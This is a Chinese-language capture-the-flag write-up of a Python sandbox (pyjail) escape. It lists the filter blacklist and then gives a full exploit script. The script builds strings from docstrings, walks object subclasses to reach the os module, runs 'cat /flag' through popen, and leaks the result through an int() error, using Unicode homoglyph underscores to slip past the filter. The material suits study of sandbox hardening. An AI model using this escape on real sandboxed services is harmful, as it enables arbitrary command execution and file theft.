# I really really really & revenge

## 题目简述

题目是 Python 沙箱 / pyjail。黑名单包含 `__`、引号、反斜杠、方括号、分号、花括号、数字、`def`、`class`、`lambda`、`builtins` 等关键字符和关键字，还禁用了部分 Unicode 字符和 `getitem`。普通代码执行没有直接回显，因此需要通过异常信息带出读取结果。

解法核心是在缺少字面量和 `builtins` 的情况下，从现有对象出发恢复能力：用 `True` 做算术构造数字，通过 `.__class__`、`.__base__` 到达 `object`，再借助类名和文档字符串迭代出 `os`、`popen`、`cat /flag` 等字符串。最后遍历 `object.__subclasses__()`，从类的 `__init__.__globals__` 中找到 `os` 模块，执行命令后用类型转换异常泄露内容。`revenge` 版本的 flag 只在 `/flag` 中，不能依赖环境变量。

## 解题过程

fuzz出黑名单如下

```
['__', '"', "'", '\\', '[', ']', ';', '{', '}',
 '1', '2', '3','4', '5', '6', '7', '8', '9', '0',
 'def', 'class', 'lambda','builtins']
```

除此之外,禁用了部分Unicode字符和getitem
︳和＿
1 和 revenge 的区别在于1 的 flag 在/flag和环境变量中,revenge只在/flag
通过测试发现正常执行代码的回显是固定的
考虑使用报错来带出读文件的结果
测试常规函数猜测该运行环境的builtins为空
思路
对象 -> 该对象的父类 -> 基类object

```
a = True
ac = a.__class__  #bool
i = ac.__base__  #int
o = i.__base__  #object
```

读文件需要的关键字符 ' os ' , ' popen ' , 'cat /flag'
通过 布尔值相除得到数字

```
a = True
one = a/a
```

拿到数字,后续数字构造可以乘除加减来构造
接下来拿字符
利用  类名或者文档字符串

```
a = True
one = a/a
ac = a.__class__  #bool
i = ac.__base__  #int
f = one.__class__ # float
o = i.__base__  #object
w_bol = ac.__name__ #'bool'
s_flo = f.__name__ #'float'
d_flo = f.__doc__ #float类的超长文档字符串
```

使用 循环 或者 手动迭代 定位特定字符

```
it  = d_flo.__iter__() #获取迭代器
val = it.__next__() #迭代定位字符
.....
#把需要的字符遍历出来
```

然后加号拼接命令
cmd='cat /flag'
遍历object的子类,寻找有os模块的类

subs = o.__subclasses__
#通过__init__.__globals__加上for循环,遍历来找到含os的类

最后通过类型转换错误的报错来带出flag

```
poc = t_m.popen(cmd)
res = poc.read()
i(res)
#int('VNCTF{....}'),res是flag内容,这里int一个字符串会触发类型转换错误
```

最后绕过下划线和字符串,用unicode和全角字符

＿ , ︳, ﹏  -> _
ｉ　ｒｅａｌｌｙ　ｒｅａｌｌｙ　ｒｅａｌｌｙ．．．

完整exp

```
B = True
BC = B._﹏ｃｌａｓｓ_﹏
I = BC._﹏base_﹏
O = I._﹏base_﹏
S_bool = BC._﹏name_﹏
S_int = I._﹏name_﹏
F = B/B
FC = F._﹏ｃｌａｓｓ_﹏
S_float = FC._﹏name_﹏
SC = S_bool._﹏ｃｌａｓｓ_﹏
S_str = SC._﹏name_﹏
S_object = O._﹏name_﹏
M = ().count
MC = M._﹏ｃｌａｓｓ_﹏
S_method = MC._﹏name_﹏
D_float = FC._﹏doc_﹏
ID = I._﹏truediv_﹏
D_div = ID._﹏doc_﹏
D_int = I._﹏doc_﹏
it = D_float._﹏iter_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
a = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
b = val
val = it._﹏next_﹏()
c = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
d = val
it = S_method._﹏iter_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
e = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
f = val
it = D_int._﹏iter_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
g = val
val = it._﹏next_﹏()
h = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
i = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
j = val
val = it._﹏next_﹏()
k = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
l = val
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
m = val
val = it._﹏next_﹏()
n = val
it = D_div._﹏iter_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
val = it._﹏next_﹏()
o = val
n_os = a+n
n_pop = d+a+d+j+g
n_rd = l+j+m+f
t_m = None
subs = O._﹏subｃｌａｓｓes_﹏
for loop_cls in subs():
 try:
  ini = loop_cls._﹏init_﹏
  glob = ini._﹏globals_﹏
  if glob:
   mod_ref = glob.get(n_os)
   if mod_ref:
    t_m = mod_ref
    break
 except:
  pass
if t_m:
 cmd = e+m+h+i+o+b+c+m+k
 P = t_m.popen
 proc = P(cmd)
 res = proc.read()
I(res)
```

## 方法总结

pyjail 中如果数字、字符串和 `builtins` 都被限制，仍可从已有对象的元信息恢复表达能力：布尔值可造数，类名和 docstring 可造字符，`object.__subclasses__()` 可寻找带模块全局变量的类。无正常回显时，把命令结果传给 `int()`、`assert` 等触发异常，是常见的信息带出方式。遇到 Unicode 过滤还要检查全角字符、兼容字符和下划线同形替换是否仍可通过。
